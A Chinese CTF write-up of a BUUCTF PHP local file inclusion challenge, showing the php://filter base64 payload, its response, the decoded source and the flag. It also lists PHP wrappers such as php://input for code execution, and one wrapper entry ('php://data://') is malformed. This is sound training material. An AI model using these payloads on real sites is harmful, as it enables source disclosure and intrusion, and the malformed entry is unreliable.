---

title: "[ACTF2020 新生赛]Include"
platform: BUUCTF
category: Web
difficulty: 入门
tags: [file-inclusion, php-filter, lfi]
vulnerability: PHP 文件包含漏洞，可通过伪协议读取源码
solved: true
flag: "flag{c6aed76f-336f-476c-8f0c-43bf0619d33b}"
---

# [ACTF2020 新生赛]Include

## 题目概述
一道 PHP 文件包含漏洞入门题，题目名称 "Include" 直接提示了漏洞类型。页面提供一个链接 `?file=flag.php`，暗示通过 file 参数进行文件包含。

## 信息收集
1. 访问题目首页，页面源码：
```html
<meta charset="utf8">
<a href="?file=flag.php">tips</a>
```

2. 点击链接访问 `?file=flag.php`，返回：
```
Can you find out the flag?
```

说明 flag.php 被包含执行了，但 PHP 代码中的 flag 在注释中，不会直接显示。

## 漏洞分析（漏洞类型、原理、判断过程）

**漏洞类型**：本地文件包含（LFI）

**判断过程**：
- 题目名称 "Include" 直接提示文件包含
- URL 参数 `?file=flag.php` 明显是文件包含点
- 直接包含 flag.php 只显示输出内容，说明 PHP 代码被执行而非读取源码

**原理**：
PHP 的 `include()` / `require()` 函数会执行被包含文件的 PHP 代码。要读取源码而非执行，需要使用 `php://filter` 伪协议配合 base64 编码。

## 利用过程（Payload + Flag）

**Payload**：使用 php://filter 伪协议读取源码
```
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

**响应**：
```
PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7YzZhZWQ3NmYtMzM2Zi00NzZjLThmMGMtNDNiZjA2MTlkMzNifQo=
```

**解码后**：
```php
<?php
echo "Can you find out the flag?";
//flag{c6aed76f-336f-476c-8f0c-43bf0619d33b}
```

**Flag**：`flag{c6aed76f-336f-476c-8f0c-43bf0619d33b}`

## 复现步骤
1. 访问题目 URL
2. 发现 `?file=` 参数存在文件包含
3. 构造 Payload：`?file=php://filter/read=convert.base64-encode/resource=flag.php`
4. Base64 解码获取 flag.php 源码
5. 在注释中找到 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 项目 | 内容 |
|------|------|
| 漏洞类型 | 本地文件包含 (LFI) |
| 攻击入口 | `?file=` GET 参数 |
| 核心 Payload | `php://filter/read=convert.base64-encode/resource=flag.php` |
| 知识点 | PHP 伪协议、文件包含、源码读取 |

## 知识总结（解题技巧、同类题型套路）

**PHP 伪协议速查**：
- `php://filter/read=convert.base64-encode/resource=xxx` — 读取源码（base64编码）
- `php://input` — 读取 POST 数据，可配合代码执行
- `php://data://text/plain,xxx` — 数据流协议

**解题套路**：
1. 看到 `include` 类题目，首先尝试 `php://filter` 读取源码
2. 如果 filter 被禁，尝试 `php://input` + POST 数据执行代码
3. 注意 flag 可能在注释中、隐藏变量中或需要其他条件触发
